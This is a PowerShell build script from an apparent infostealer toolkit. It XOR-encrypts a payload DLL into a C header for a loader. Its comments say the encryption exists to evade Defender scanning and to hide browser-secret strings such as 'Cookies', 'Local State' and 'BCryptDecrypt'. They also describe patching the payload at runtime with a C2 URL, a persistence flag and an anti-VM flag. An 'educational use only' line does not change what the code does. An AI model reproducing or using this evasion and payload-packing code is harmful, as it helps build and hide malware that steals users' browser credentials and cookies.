# gen.ps1 -- converts ckdll.dll into src/payload.h (XOR-encrypted byte array for loader.cpp)
# EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
#
# The DLL bytes are XOR-encrypted with a 16-byte key so that Defender cannot
# statically scan the embedded payload (imports, strings like "Cookies",
# "Local State", "BCryptDecrypt" etc. are all obfuscated).
#
# At runtime, loader.cpp decrypts the payload, then searches the decrypted
# buffer for the sentinels ("CKC2_DEADBEEF_", "CKPR____", "CKAV0000") and
# patches them with the C2 URL / persist flag / anti-VM skip flag.
# The loader has its own plaintext copies of these sentinels (in its .data
# section) that auto.py/pick.py can find and patch in loader.exe.

$b = [IO.File]::ReadAllBytes("$PSScriptRoot\..\bin\ckdll.dll")
$len = $b.Length

# Derive 16-byte XOR key from the DLL's own bytes (deterministic, varies per build)
# Uses first/last 16 bytes XOR'd with position constants — no PRNG needed
$key = New-Object byte[] 16
for ($i = 0; $i -lt 16; $i++) {
    $key[$i] = [byte](($b[$i] -bxor $b[$len - 1 - $i] -bxor (($i * 37 + 0x5A) -band 0xFF)) -band 0xFF)
}

# XOR-encrypt the DLL bytes
$enc = New-Object byte[] $len
for ($i = 0; $i -lt $len; $i++) {
    $enc[$i] = [byte]($b[$i] -bxor $key[$i -band 15])
}

# Format key as C array
$keyStr = ($key | ForEach-Object { "0x{0:x2}" -f $_ }) -join ","
# Format encrypted bytes as C array
$encStr = [System.Text.StringBuilder]::new($len * 5)
for ($i = 0; $i -lt $len; $i++) {
    if ($i -gt 0) { [void]$encStr.Append(",") }
    [void]$encStr.Append("0x{0:x2}" -f $enc[$i])
}

Set-Content -Encoding ascii "$PSScriptRoot\payload.h" @"
#pragma once
// Auto-generated by gen.ps1 -- XOR-encrypted payload (Defender evasion)
// Original DLL size: $len bytes, XOR key: 16 bytes
static unsigned char g_xor_key[16] = {$keyStr};
static unsigned char g_payload_enc[] = {$($encStr.ToString())};
static unsigned int g_payload_len = $len;
#define PAYLOAD_ENTRY "payload_entry"
"@

Write-Host "gen.ps1: encrypted $len bytes with 16-byte XOR key -> payload.h"
